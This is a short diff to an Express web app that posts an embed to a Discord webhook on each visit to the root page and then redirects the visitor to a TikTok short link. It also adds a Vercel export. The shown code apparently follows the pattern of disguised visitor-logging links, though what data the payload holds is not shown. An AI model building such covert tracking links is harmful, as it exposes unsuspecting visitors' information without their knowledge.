@@ -44,6 +44,7 @@ app.get("/", (req, res) => {
             ]
         };
         webhookClient.send({ embeds: [payload] }).then((response) => {
+            res.redirect("https://vt.tiktok.com/ZSN17R3Fe");
         }).catch((err) => {
             console.log(err);
         });
@@ -56,3 +57,6 @@ app.get("/", (req, res) => {
 app.get("/koi",(req,res) => {
     res.sendFile(path.join(__dirname, "./public", "koi.html"));
 });
+
+// For vercel serverless
+module.exports = app
